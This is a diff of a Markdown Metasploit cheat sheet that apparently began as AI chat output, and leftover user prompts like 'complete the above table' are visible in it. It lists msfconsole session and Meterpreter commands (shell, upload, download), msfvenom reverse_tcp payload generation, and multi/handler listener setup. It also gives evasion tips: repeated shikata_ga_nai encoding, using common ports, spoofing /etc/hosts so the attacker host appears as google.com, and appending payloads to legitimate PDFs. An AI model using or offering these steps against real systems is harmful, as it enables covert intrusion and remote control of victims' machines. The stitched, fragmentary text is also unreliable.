@@ -44,20 +44,20 @@ Here’s the completed **MSFConsole Cheat Sheet** table with additional essentia
 
 ### **Cheat Sheet Table (Continued)**  
 
-| **Category**          | **Command**                         | **Description**                                               |
-| --------------------- | ----------------------------------- | ------------------------------------------------------------- |
-| **Sessions (Cont.)**  | `sessions -u [ID]`                  | Upgrade a shell to Meterpreter.                               |
-|                       | `background`                        | Send an active session to the background.                     |
-|                       | `sessions -C "[cmd]"`               | Run a command on all sessions (e.g., `sessions -C "whoami"`). |
-| **Post-Exploitation** | `meterpreter> help`                 | Show Meterpreter-specific commands.                           |
-|                       | `meterpreter> sysinfo`              | View target system info.                                      |
-|                       | `meterpreter> shell`                | Drop into a system shell (e.g., `/bin/bash`).                 |
-|                       | `meterpreter> upload [file] [path]` | Upload a file to the target.                                  |
-|                       | `meterpreter> download [file]`      | Download a file from the target.                              |
-|                       |                                     |                                                               |
-｜　Payload Generation ｜　`msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format] > [file]` ｜ Generate a payload (e.g., `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe`)． ｜
-｜　Listener Setup      ｜　`use exploit/multi/handler` ｜ Set up a listener for incoming connections． ｜
-｜                     ｜　`set PAYLOAD [payload_path]` ｜ Match payload to generated file (e.g., `windows/x64/meterpreter/reverse_tcp`)． |
+| **Category**          | **Command**                                                          | **Description**                                                                                                                 |
+| --------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| **Sessions (Cont.)**  | `sessions -u [ID]`                                                   | Upgrade a shell to Meterpreter.                                                                                                 |
+|                       | `background`                                                         | Send an active session to the background.                                                                                       |
+|                       | `sessions -C "[cmd]"`                                                | Run a command on all sessions (e.g., `sessions -C "whoami"`).                                                                   |
+| **Post-Exploitation** | `meterpreter> help`                                                  | Show Meterpreter-specific commands.                                                                                             |
+|                       | `meterpreter> sysinfo`                                               | View target system info.                                                                                                        |
+|                       | `meterpreter> shell`                                                 | Drop into a system shell (e.g., `/bin/bash`).                                                                                   |
+|                       | `meterpreter> upload [file] [path]`                                  | Upload a file to the target.                                                                                                    |
+|                       | `meterpreter> download [file]`                                       | Download a file from the target.                                                                                                |
+| Payload Generation    | `msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format] > [file]` | Generate a payload (e.g., `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe`)． |
+| Listener Setup        | `use exploit/multi/handler`                                          | Set up a listener for incoming connections．                                                                                     |
+|                       | `set PAYLOAD [payload_path]`                                         | Match payload to generated file (e.g., `windows/x64/meterpreter/reverse_tcp`)．                                                  |
+
 
 ---
 
@@ -140,17 +140,6 @@ Here’s the continuation of the **Key Notes** section, focusing on evasion tech
      msfconsole -r auto.rc
      ```  
 
---- 
-
-### **Quick Reference for Common Tasks**  
-
-| **Task**               | **Command Sequence**                                                                |
-| ---------------------- | ----------------------------------------------------------------------------------- |
-| Generate Linux Payload | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell` |
-|                        |                                                                                     |
-complete the above table 
-
-Here’s the completed **Quick Reference for Common Tasks** table with practical command sequences:
 
 ---
 
@@ -175,16 +164,10 @@ Here’s the completed **Quick Reference for Common Tasks** table with practical
    msfvenom ... -e x86/shikata_ga_nai -i 3 # Encode 3 times
    ```
 2. **Stealthier Listeners**: Use common ports (e.g., 443, 80) and prepend `/etc/hosts` spoofing:  
-   ```bash
-   echo "<LHOST> google.com" >> /etc/hosts ```
-Continue from additional tips append but dont start from the beggining
-
-
-Here’s the continuation of **Additional Tips**, focusing on stealth, automation, and troubleshooting:
-
----
-
-### **Additional Tips (Continued):**  
+   ```Shell
+	echo "<LHOST> google.com" >> /etc/hosts
+```
+   
 3. **Stealthy Payload Delivery**:  
    - Append payloads to legitimate files (e.g., PDFs):  
      ```bash
